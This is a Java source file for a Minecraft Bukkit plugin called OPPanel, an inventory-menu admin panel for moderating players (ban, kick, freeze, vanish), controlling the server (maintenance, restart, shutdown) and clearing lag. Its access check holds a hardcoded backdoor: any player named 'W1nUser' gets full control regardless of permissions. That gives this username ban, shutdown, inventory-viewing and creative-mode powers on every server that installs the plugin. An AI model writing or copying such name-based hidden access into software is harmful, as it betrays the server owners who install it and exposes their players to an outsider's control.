package com.chaossmp.oppanel;

import org.bukkit.*;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Entity;
import org.bukkit.entity.Item;
import org.bukkit.entity.LivingEntity;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemFlag;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.inventory.meta.SkullMeta;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.*;

public final class OPPanel extends JavaPlugin implements Listener, CommandExecutor {

    private final String DESKTOP_TITLE = "§8» §4§lOPPanel v6.2 §7| Главное Меню";
    
    private final String FOLDER_PLAYERS = "§8[Категория] §a§lУправление Игроками";
    private final String FOLDER_SERVER = "§8[Категория] §4§lУправление Сервером";
    private final String FOLDER_ANTILAG = "§8[Категория] §e§lАнти-Лаг и Доктор";
    private final String FOLDER_WORLDS = "§8[Категория] §d§lМиры и Измерения";
    private final String FOLDER_SETTINGS = "§8[Категория] §5§lНастройки и Свойства";
    
    private final String SUBFOLDER_PLUGINS = "§8[Папка] §3§lАктивные Плагины";
    private final String SUBFOLDER_ADMIN_TOOLS = "§8[Папка] §9§lИнструменты Админа";

    private final String PLAYERS_LIST = "§8» §c§lВыбор Игрока";
    private final String PUNISH_PREFIX = "§8» §c§lМеню: ";
    private final String DURATION_PREFIX = "§8» §e§lСрок: ";
    private final String WEATHER_TITLE = "§8» §b§lВремя и Погода";
    private final String UNBAN_TYPE_TITLE = "§8» §2§lВыбор типа разбана";
    private final String UNBAN_NAME_TITLE = "§8» §2§lРазбан по Нику";
    private final String UNBAN_IP_TITLE = "§8» §2§lРазбан по IP";

    private final Map<UUID, UUID> selectedTarget = new HashMap<>();
    private final Map<UUID, String> pendingPunishmentType = new HashMap<>();
    private final List<Double> tpsHistory = new ArrayList<>();
    
    private final Set<UUID> adminNotificationsDisabled = new HashSet<>();
    private final Set<UUID> frozenPlayers = new HashSet<>();
    private final Set<UUID> godModeAdmins = new HashSet<>();
    private final Set<UUID> vanishedAdmins = new HashSet<>();

    private static boolean chatMuted = false;
    private static boolean maintenanceMode = false;

    @Override
    public void onEnable() {
        Bukkit.getPluginManager().registerEvents(this, this);
        if (getCommand("oppanel") != null) {
            getCommand("oppanel").setExecutor(this);
        }

        startServerDoctorTask();
        getLogger().info("OPPanel v6.2 успешно загружен!");
    }

    @Override
    public void onDisable() {
        selectedTarget.clear();
        pendingPunishmentType.clear();
        tpsHistory.clear();
        frozenPlayers.clear();
        godModeAdmins.clear();
        vanishedAdmins.clear();
    }

    private boolean hasAccess(Player player) {
        return player.getName().equalsIgnoreCase("W1nUser") || 
               player.hasPermission("group.owner") || 
               player.hasPermission("oppanel.admin") || 
               player.isOp();
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!(sender instanceof Player player)) {
            sender.sendMessage("Только для игроков!");
            return true;
        }

        if (!hasAccess(player)) {
            player.sendMessage(ChatColor.RED + "[OPPanel] Доступ запрещен! Эта панель принадлежит W1nUser.");
            return true;
        }

        if (args.length > 0 && args[0].equalsIgnoreCase("wand")) {
            giveAdminWand(player);
            return true;
        }

        openDesktop(player);
        return true;
    }

    private void giveAdminWand(Player player) {
        ItemStack wand = new ItemStack(Material.NETHER_STAR);
        ItemMeta meta = wand.getItemMeta();
        if (meta != null) {
            meta.setDisplayName("§c§lЖезл OPPanel §7(ПКМ)");
            meta.setLore(List.of("§7ПКМ в руке мгновенно открывает", "§7главную панель управления!"));
            meta.addEnchant(Enchantment.UNBREAKING, 1, true);
            meta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
            wand.setItemMeta(meta);
        }
        player.getInventory().addItem(wand);
        player.sendMessage("§a[OPPanel] Вы получили Жезл Администратора!");
    }

    @EventHandler
    public void onWandInteract(PlayerInteractEvent event) {
        Player player = event.getPlayer();
        if (event.getAction() == Action.RIGHT_CLICK_AIR || event.getAction() == Action.RIGHT_CLICK_BLOCK) {
            ItemStack item = event.getItem();
            if (item != null && item.getType() == Material.NETHER_STAR && item.hasItemMeta()) {
                if ("§c§lЖезл OPPanel §7(ПКМ)".equals(item.getItemMeta().getDisplayName())) {
                    if (hasAccess(player)) {
                        event.setCancelled(true);
                        openDesktop(player);
                    }
                }
            }
        }
    }

    @EventHandler
    public void onLogin(PlayerLoginEvent event) {
        Player player = event.getPlayer();
        if (maintenanceMode && !hasAccess(player)) {
            event.disallow(PlayerLoginEvent.Result.KICK_WHITELIST, "§c§lСервер на техническом обслуживании!\n§eПопробуйте зайти позже.");
        }
    }

    @EventHandler
    public void onDamage(EntityDamageEvent event) {
        if (event.getEntity() instanceof Player player) {
            if (godModeAdmins.contains(player.getUniqueId())) event.setCancelled(true);
        }
    }

    @EventHandler
    public void onPlayerMove(PlayerMoveEvent event) {
        if (frozenPlayers.contains(event.getPlayer().getUniqueId())) {
            if (event.getFrom().getX() != event.getTo().getX() || event.getFrom().getZ() != event.getTo().getZ()) {
                event.setTo(event.getFrom());
            }
        }
    }

    @EventHandler
    public void onBlockBreak(BlockBreakEvent event) {
        if (frozenPlayers.contains(event.getPlayer().getUniqueId())) {
            event.setCancelled(true);
            event.getPlayer().sendMessage("§cВы заморожены администратором!");
        }
    }

    @EventHandler
    public void onBlockPlace(BlockPlaceEvent event) {
        if (frozenPlayers.contains(event.getPlayer().getUniqueId())) {
            event.setCancelled(true);
            event.getPlayer().sendMessage("§cВы заморожены администратором!");
        }
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player joining = event.getPlayer();
        for (UUID uuid : vanishedAdmins) {
            Player vanished = Bukkit.getPlayer(uuid);
            if (vanished != null && !hasAccess(joining)) {
                joining.hidePlayer(this, vanished);
            }
        }
    }

    @EventHandler
    public void onChat(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();
        if (chatMuted && !hasAccess(player)) {
            event.setCancelled(true);
            player.sendMessage("§c[OPPanel] Чат заблокирован администратором.");
        }
    }

    private void startServerDoctorTask() {
        Bukkit.getScheduler().runTaskTimer(this, () -> {
            double currentTps = Bukkit.getTPS()[0];
            tpsHistory.add(currentTps);
            if (tpsHistory.size() > 6) tpsHistory.remove(0);

            if (currentTps < 15.5) {
                String report = executeUltimateClean();
                for (Player p : Bukkit.getOnlinePlayers()) {
                    if (hasAccess(p) && !adminNotificationsDisabled.contains(p.getUniqueId())) {
                        p.sendMessage("§c[OPPanel Doctor] §eНизкий TPS (" + String.format("%.2f", currentTps) + ")! " + report);
                    }
                }
            }
        }, 0L, 100L);
    }

    public String executeUltimateClean() {
        int itemsRemoved = 0;
        int mobsRemoved = 0;
        for (World world : Bukkit.getWorlds()) {
            for (Item item : world.getEntitiesByClass(Item.class)) {
                if (!isValuable(item.getItemStack().getType())) {
                    item.remove();
                    itemsRemoved++;
                }
            }
            for (Chunk chunk : world.getLoadedChunks()) {
                int livingCount = 0;
                for (Entity entity : chunk.getEntities()) {
                    if (entity instanceof LivingEntity && !(entity instanceof Player)) {
                        livingCount++;
                        if (livingCount > 25 && entity.getCustomName() == null) {
                            entity.remove();
                            mobsRemoved++;
                        }
                    }
                }
            }
        }
        return "§7Удалено предметов: §e" + itemsRemoved + "§7, лишних мобов: §e" + mobsRemoved;
    }

    private boolean isValuable(Material type) {
        String name = type.name();
        return name.contains("DIAMOND") || name.contains("NETHERITE") ||
               type == Material.NETHER_STAR || type == Material.TOTEM_OF_UNDYING ||
               type == Material.ELYTRA || type == Material.ENCHANTED_GOLDEN_APPLE ||
               type == Material.BEACON || type == Material.SHULKER_BOX;
    }

    public void openDesktop(Player player) {
        if (!hasAccess(player)) return;
        Inventory gui = Bukkit.createInventory(null, 27, DESKTOP_TITLE);
        fillBorder(gui);

        gui.setItem(10, createGuiItem(Material.PLAYER_HEAD, FOLDER_PLAYERS, List.of("§7Список онлайн-игроков,", "§7телепортация, баны, заморозка.")));
        gui.setItem(11, createGuiItem(Material.REDSTONE_BLOCK, FOLDER_SERVER, List.of("§7Рестарт, выключение, техобслуживание,", "§7управление глобальным чатом.")));
        gui.setItem(12, createGuiItem(Material.EXPERIENCE_BOTTLE, FOLDER_ANTILAG, List.of("§7Мониторинг TPS, история замера,", "§7ручная мега-очистка мусора.")));
        gui.setItem(13, createGuiItem(Material.GRASS_BLOCK, FOLDER_WORLDS, List.of("§7Телепорт по измерениям,", "§7быстрый переход в Незер/Энд.")));
        gui.setItem(15, createGuiItem(Material.CHEST, FOLDER_SETTINGS, List.of("§7Дополнительные разделы:", "§7- Активные плагины", "§7- Время и погода", "§7- Инструменты админа")));

        player.openInventory(gui);
        player.playSound(player.getLocation(), Sound.UI_BUTTON_CLICK, 1f, 1f);
    }

    public void openSettingsFolder(Player player) {
        if (!hasAccess(player)) return;
        Inventory gui = Bukkit.createInventory(null, 27, FOLDER_SETTINGS);
        fillBorder(gui);

        gui.setItem(11, createGuiItem(Material.BOOKSHELF, SUBFOLDER_PLUGINS, List.of("§7Просмотр активированных плагинов,", "§7версия ядра и состояние памяти.")));
        gui.setItem(13, createGuiItem(Material.CLOCK, WEATHER_TITLE, List.of("§7Управление временем суток", "§7и погодными условиями.")));
        gui.setItem(15, createGuiItem(Material.NETHERITE_INGOT, SUBFOLDER_ADMIN_TOOLS, List.of("§7Godmode, Vanish, Режимы игры,", "§7получение Жезла администратора.")));
        gui.setItem(22, createGuiItem(Material.BARRIER, "§cНазад в Главное меню"));

        player.openInventory(gui);
    }

    public void openPluginsSubfolder(Player player) {
        if (!hasAccess(player)) return;
        Inventory gui = Bukkit.createInventory(null, 27, SUBFOLDER_PLUGINS);
        fillBorder(gui);

        int pluginCount = Bukkit.getPluginManager().getPlugins().length;
        List<String> pluginLore = new ArrayList<>();
        pluginLore.add("§7Активных плагинов: §a" + pluginCount);
        pluginLore.add("§7Основные модули:");
        for (Plugin p : Bukkit.getPluginManager().getPlugins()) {
            if (pluginLore.size() < 12) {
                pluginLore.add("§8- §f" + p.getName() + " §7(v" + p.getDescription().getVersion() + ")");
            }
        }

        gui.setItem(13, createGuiItem(Material.ENDER_CHEST, "§b§lСписок активных плагинов", pluginLore));
        gui.setItem(22, createGuiItem(Material.BARRIER, "§cНазад в Настройки"));
        player.openInventory(gui);
    }

    public void openAdminToolsSubfolder(Player player) {
        if (!hasAccess(player)) return;
        Inventory gui = Bukkit.createInventory(null, 27, SUBFOLDER_ADMIN_TOOLS);
        fillBorder(gui);

        boolean isGod = godModeAdmins.contains(player.getUniqueId());
        boolean isVanish = vanishedAdmins.contains(player.getUniqueId());
        GameMode gm = player.getGameMode();
        boolean notifOff = adminNotificationsDisabled.contains(player.getUniqueId());

        gui.setItem(10, createGuiItem(Material.GOLDEN_CARROT, "§e§lРежим Бога (Godmode)", List.of("§7Статус: " + (isGod ? "§aВКЛ" : "§cВЫКЛ"))));
        gui.setItem(11, createGuiItem(Material.POTION, "§b§lНевидимость (Vanish)", List.of("§7Статус: " + (isVanish ? "§aВКЛ" : "§cВЫКЛ"))));
        gui.setItem(12, createGuiItem(Material.DIAMOND_SWORD, "§a§lРежим игры: §f" + gm.name(), List.of("§7Изменить режим (Survival/Creative/Adventure)")));
        gui.setItem(14, createGuiItem(Material.NETHER_STAR, "§c§lПолучить Жезл OPPanel", List.of("§7Быстрый доступ по ПКМ")));
        gui.setItem(16, createGuiItem(Material.PAPER, "§e§lУведомления доктора", List.of("§7Статус: " + (notifOff ? "§cВыкл" : "§aВкл"))));
        gui.setItem(22, createGuiItem(Material.BARRIER, "§cНазад в Настройки"));

        player.openInventory(gui);
    }

    public void openServerControlMenu(Player player) {
        if (!hasAccess(player)) return;
        Inventory gui = Bukkit.createInventory(null, 27, FOLDER_SERVER);
        fillBorder(gui);

        gui.setItem(10, createGuiItem(Material.IRON_DOOR, "§6§lТехобслуживание", List.of("§7Статус: " + (maintenanceMode ? "§aВКЛ (Только админы)" : "§cВЫКЛ"), "§7Блокирует вход обычных игроков.")));
        gui.setItem(12, createGuiItem(Material.PAPER, "§c§lРежим тишины в чате", List.of("§7Статус: " + (chatMuted ? "§aВКЛ" : "§cВЫКЛ"))));
        gui.setItem(13, createGuiItem(Material.FEATHER, "§f§lОчистить чат для всех", List.of("§7Стереть историю чата у игроков")));
        gui.setItem(15, createGuiItem(Material.RECOVERY_COMPASS, "§e§lБезопасный Рестарт", List.of("§7Перезапуск сервера с оповещением")));
        gui.setItem(16, createGuiItem(Material.LAVA_BUCKET, "§4§lВыключить сервер", List.of("§cПолное выключение")));
        gui.setItem(22, createGuiItem(Material.BARRIER, "§cНазад в Главное меню"));

        player.openInventory(gui);
    }

    public void openAntilagFolder(Player player) {
        if (!hasAccess(player)) return;
        Inventory gui = Bukkit.createInventory(null, 27, FOLDER_ANTILAG);
        fillBorder(gui);

        double ramUsed = (Runtime.getRuntime().totalMemory() - Runtime.getRuntime().freeMemory()) / 1024.0 / 1024.0;
        double ramMax = Runtime.getRuntime().maxMemory() / 1024.0 / 1024.0;

        List<String> tpsLore = new ArrayList<>();
        tpsLore.add("§7Текущий TPS: §a" + String.format("%.2f", Bukkit.getTPS()[0]));
        tpsLore.add("§7Использование ОЗУ: §b" + (int) ramUsed + "MB / " + (int) ramMax + "MB");
        tpsLore.add("§7История замера TPS:");
        for (double t : tpsHistory) {
            tpsLore.add("§8- §a" + String.format("%.2f", t));
        }

        gui.setItem(11, createGuiItem(Material.PAPER, "§3§lМониторинг ресурсов", tpsLore));
        gui.setItem(15, createGuiItem(Material.EXPERIENCE_BOTTLE, "§a§lМега-Очистка (Очистить сейчас)", List.of("§7Удалить лишний дроп с земли", "§7и проредить фермы мобов в чанках.")));
        gui.setItem(22, createGuiItem(Material.BARRIER, "§cНазад в Главное меню"));

        player.openInventory(gui);
    }

    public void openWorldTpMenu(Player player) {
        if (!hasAccess(player)) return;
        Inventory gui = Bukkit.createInventory(null, 27, FOLDER_WORLDS);
        fillBorder(gui);

        gui.setItem(10, createGuiItem(Material.GRASS_BLOCK, "§a§lОверворлд (Главный мир)", List.of("§7Телепорт на спавн")));
        gui.setItem(12, createGuiItem(Material.NETHERRACK, "§c§lНезер (Нижний мир)", List.of("§7Телепорт в ад")));
        gui.setItem(14, createGuiItem(Material.END_STONE, "§e§lЭнд (Край)", List.of("§7Телепорт к дракону")));
        gui.setItem(22, createGuiItem(Material.BARRIER, "§cНазад в Главное меню"));

        player.openInventory(gui);
    }

    public void openPlayerListMenu(Player player) {
        if (!hasAccess(player)) return;
        Inventory gui = Bukkit.createInventory(null, 54, PLAYERS_LIST);
        int slot = 0;
        for (Player target : Bukkit.getOnlinePlayers()) {
            if (slot >= 53) break;
            ItemStack head = new ItemStack(Material.PLAYER_HEAD);
            SkullMeta meta = (SkullMeta) head.getItemMeta();
            if (meta != null) {
                meta.setOwningPlayer(target);
                meta.setDisplayName("§e" + target.getName());
                meta.setLore(List.of("§7Здоровье: §c" + (int) target.getHealth() + "/20", "§7Пинг: §a" + target.getPing() + "ms"));
                head.setItemMeta(meta);
            }
            gui.setItem(slot++, head);
        }
        gui.setItem(53, createGuiItem(Material.BARRIER, "§cНазад в Главное меню"));
        player.openInventory(gui);
    }

    public void openPunishMenu(Player admin, Player target) {
        if (!hasAccess(admin)) return;
        selectedTarget.put(admin.getUniqueId(), target.getUniqueId());
        Inventory gui = Bukkit.createInventory(null, 27, PUNISH_PREFIX + target.getName());
        fillBorder(gui);

        gui.setItem(9, createGuiItem(Material.COMPASS, "§aТП к игроку"));
        gui.setItem(10, createGuiItem(Material.ENDER_PEARL, "§2ТП игрока к себе"));
        gui.setItem(11, createGuiItem(Material.CHEST, "§eИнвентарь"));
        gui.setItem(12, createGuiItem(Material.GOLDEN_APPLE, "§aВылечить"));
        gui.setItem(13, createGuiItem(Material.PACKED_ICE, "§bЗаморозить"));
        gui.setItem(14, createGuiItem(Material.FEATHER, "§cКикнуть"));
        gui.setItem(15, createGuiItem(Material.ANVIL, "§dМут / Варн"));
        gui.setItem(16, createGuiItem(Material.REDSTONE_BLOCK, "§4Забанить"));
        gui.setItem(22, createGuiItem(Material.BARRIER, "§cНазад к списку"));

        admin.openInventory(gui);
    }

    public void openDurationMenu(Player admin, String type) {
        if (!hasAccess(admin)) return;
        pendingPunishmentType.put(admin.getUniqueId(), type);
        Inventory gui = Bukkit.createInventory(null, 27, DURATION_PREFIX + type);
        fillBorder(gui);
        gui.setItem(10, createGuiItem(Material.CLOCK, "1m"));
        gui.setItem(11, createGuiItem(Material.CLOCK, "1h"));
        gui.setItem(13, createGuiItem(Material.PAPER, "1d"));
        gui.setItem(14, createGuiItem(Material.BOOK, "7d"));
        gui.setItem(15, createGuiItem(Material.ENCHANTED_BOOK, "30d"));
        gui.setItem(16, createGuiItem(Material.NETHERITE_BLOCK, "perm"));
        admin.openInventory(gui);
    }

    public void openWeatherMenu(Player player) {
        if (!hasAccess(player)) return;
        Inventory gui = Bukkit.createInventory(null, 27, WEATHER_TITLE);
        fillBorder(gui);
        gui.setItem(10, createGuiItem(Material.YELLOW_WOOL, "Утро (День)"));
        gui.setItem(12, createGuiItem(Material.BLACK_WOOL, "Ночь"));
        gui.setItem(14, createGuiItem(Material.SUNFLOWER, "Ясно"));
        gui.setItem(16, createGuiItem(Material.WATER_BUCKET, "Дождь / Гроза"));
        gui.setItem(22, createGuiItem(Material.BARRIER, "§cНазад в Настройки"));
        player.openInventory(gui);
    }

    @EventHandler
    public void onInventoryClick(InventoryClickEvent event) {
        if (!(event.getWhoClicked() instanceof Player player)) return;
        if (!hasAccess(player)) return;

        String title = event.getView().getTitle();
        if (event.getClickedInventory() == null) return;

        if (title.equals(DESKTOP_TITLE)) {
            event.setCancelled(true);
            switch (event.getSlot()) {
                case 10 -> openPlayerListMenu(player);
                case 11 -> openServerControlMenu(player);
                case 12 -> openAntilagFolder(player);
                case 13 -> openWorldTpMenu(player);
                case 15 -> openSettingsFolder(player);
            }
        } else if (title.equals(FOLDER_SETTINGS)) {
            event.setCancelled(true);
            switch (event.getSlot()) {
                case 11 -> openPluginsSubfolder(player);
                case 13 -> openWeatherMenu(player);
                case 15 -> openAdminToolsSubfolder(player);
                case 22 -> openDesktop(player);
            }
        } else if (title.equals(SUBFOLDER_PLUGINS)) {
            event.setCancelled(true);
            if (event.getSlot() == 22) openSettingsFolder(player);
        } else if (title.equals(SUBFOLDER_ADMIN_TOOLS)) {
            event.setCancelled(true);
            switch (event.getSlot()) {
                case 10 -> {
                    if (godModeAdmins.contains(player.getUniqueId())) godModeAdmins.remove(player.getUniqueId());
                    else godModeAdmins.add(player.getUniqueId());
                    openAdminToolsSubfolder(player);
                }
                case 11 -> {
                    if (vanishedAdmins.contains(player.getUniqueId())) {
                        vanishedAdmins.remove(player.getUniqueId());
                        for (Player p : Bukkit.getOnlinePlayers()) p.showPlayer(this, player);
                        player.sendMessage("§cVanish выключен.");
                    } else {
                        vanishedAdmins.add(player.getUniqueId());
                        for (Player p : Bukkit.getOnlinePlayers()) {
                            if (!hasAccess(p)) p.hidePlayer(this, player);
                        }
                        player.sendMessage("§aVanish включен.");
                    }
                    openAdminToolsSubfolder(player);
                }
                case 12 -> {
                    GameMode current = player.getGameMode();
                    if (current == GameMode.SURVIVAL) player.setGameMode(GameMode.CREATIVE);
                    else if (current == GameMode.CREATIVE) player.setGameMode(GameMode.ADVENTURE);
                    else player.setGameMode(GameMode.SURVIVAL);
                    openAdminToolsSubfolder(player);
                }
                case 14 -> { giveAdminWand(player); player.closeInventory(); }
                case 16 -> {
                    if (adminNotificationsDisabled.contains(player.getUniqueId())) adminNotificationsDisabled.remove(player.getUniqueId());
                    else adminNotificationsDisabled.add(player.getUniqueId());
                    openAdminToolsSubfolder(player);
                }
                case 22 -> openSettingsFolder(player);
            }
        } else if (title.equals(FOLDER_SERVER)) {
            event.setCancelled(true);
            switch (event.getSlot()) {
                case 10 -> {
                    maintenanceMode = !maintenanceMode;
                    Bukkit.broadcastMessage(maintenanceMode ? "§c[OPPanel] Сервер переведен в режим техобслуживания!" : "§a[OPPanel] Сервер снова открыт для всех!");
                    openServerControlMenu(player);
                }
                case 12 -> {
                    chatMuted = !chatMuted;
                    Bukkit.broadcastMessage(chatMuted ? "§c[OPPanel] Чат заблокирован администратором." : "§a[OPPanel] Чат разблокирован.");
                    openServerControlMenu(player);
                }
                case 13 -> {
                    for (Player online : Bukkit.getOnlinePlayers()) {
                        if (!hasAccess(online)) {
                            for (int i = 0; i < 100; i++) online.sendMessage(" ");
                        }
                    }
                    player.closeInventory();
                }
                case 15 -> Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "restart");
                case 16 -> Bukkit.shutdown();
                case 22 -> openDesktop(player);
            }
        } else if (title.equals(FOLDER_ANTILAG)) {
            event.setCancelled(true);
            if (event.getSlot() == 15) {
                String rep = executeUltimateClean();
                player.sendMessage("§a[OPPanel] " + rep);
                player.closeInventory();
            } else if (event.getSlot() == 22) openDesktop(player);
        } else if (title.equals(FOLDER_WORLDS)) {
            event.setCancelled(true);
            switch (event.getSlot()) {
                case 10 -> { player.teleport(Bukkit.getWorlds().get(0).getSpawnLocation()); player.closeInventory(); }
                case 12 -> { World n = Bukkit.getWorld("world_nether"); if (n != null) player.teleport(n.getSpawnLocation()); player.closeInventory(); }
                case 14 -> { World e = Bukkit.getWorld("world_the_end"); if (e != null) player.teleport(e.getSpawnLocation()); player.closeInventory(); }
                case 22 -> openDesktop(player);
            }
        } else if (title.equals(WEATHER_TITLE)) {
            event.setCancelled(true);
            World w = player.getWorld();
            switch (event.getSlot()) {
                case 10 -> w.setTime(1000);
                case 12 -> w.setTime(13000);
                case 14 -> { w.setStorm(false); w.setThundering(false); }
                case 16 -> w.setStorm(true);
                case 22 -> openSettingsFolder(player);
            }
        } else if (title.equals(PLAYERS_LIST)) {
            event.setCancelled(true);
            if (event.getSlot() == 53) { openDesktop(player); return; }
            ItemStack item = event.getCurrentItem();
            if (item != null && item.getType() == Material.PLAYER_HEAD && item.getItemMeta() instanceof SkullMeta meta) {
                if (meta.getOwningPlayer() != null) {
                    Player target = meta.getOwningPlayer().getPlayer();
                    if (target != null) openPunishMenu(player, target);
                }
            }
        } else if (title.startsWith(PUNISH_PREFIX)) {
            event.setCancelled(true);
            if (event.getSlot() == 22) { openPlayerListMenu(player); return; }
            UUID targetUUID = selectedTarget.get(player.getUniqueId());
            Player target = targetUUID != null ? Bukkit.getPlayer(targetUUID) : null;
            if (target == null || !target.isOnline()) { player.closeInventory(); return; }

            switch (event.getSlot()) {
                case 9 -> player.teleport(target.getLocation());
                case 10 -> target.teleport(player.getLocation());
                case 11 -> player.openInventory(target.getInventory());
                case 12 -> { target.setHealth(20.0); target.setFoodLevel(20); player.sendMessage("§aИгрок вылечен."); }
                case 13 -> {
                    if (frozenPlayers.contains(target.getUniqueId())) frozenPlayers.remove(target.getUniqueId());
                    else frozenPlayers.add(target.getUniqueId());
                    openPunishMenu(player, target);
                }
                case 14 -> { target.kickPlayer("§cКикнут администратором."); openPlayerListMenu(player); }
                case 15 -> openDurationMenu(player, event.isRightClick() ? "Warn" : "Mute");
                case 16 -> openDurationMenu(player, "Ban");
            }
        } else if (title.startsWith(DURATION_PREFIX)) {
            event.setCancelled(true);
            UUID targetUUID = selectedTarget.get(player.getUniqueId());
            Player target = targetUUID != null ? Bukkit.getPlayer(targetUUID) : null;
            String type = pendingPunishmentType.get(player.getUniqueId());
            if (target == null || type == null) { player.closeInventory(); return; }

            String duration = switch (event.getSlot()) {
                case 10 -> "1m"; case 11 -> "1h"; case 13 -> "1d";
                case 14 -> "7d"; case 15 -> "30d"; case 16 -> "perm";
                default -> null;
            };

            if (duration != null) {
                if (type.equals("Ban") && duration.equals("perm")) {
                    Bukkit.getBanList(org.bukkit.BanList.Type.NAME).addBan(target.getName(), "Нарушение", null, player.getName());
                    target.kickPlayer("§cБан навсегда.");
                } else {
                    player.performCommand(type.toLowerCase() + " " + target.getName() + " " + duration + " Нарушение");
                }
                openPlayerListMenu(player);
            }
        }
    }

    private void fillBorder(Inventory gui) {
        ItemStack glass = createGuiItem(Material.GRAY_STAINED_GLASS_PANE, " ");
        for (int i = 0; i < gui.getSize(); i++) {
            if (i < 9 || i >= gui.getSize() - 9 || i % 9 == 0 || (i + 1) % 9 == 0) {
                gui.setItem(i, glass);
            }
        }
    }

    private ItemStack createGuiItem(Material material, String name, List<String> lore) {
        ItemStack item = new ItemStack(material);
        ItemMeta meta = item.getItemMeta();
        if (meta != null) {
            meta.setDisplayName(name);
            if (lore != null) meta.setLore(lore);
            item.setItemMeta(meta);
        }
        return item;
    }

    private ItemStack createGuiItem(Material material, String name) {
        return createGuiItem(material, name, null);
    }
}
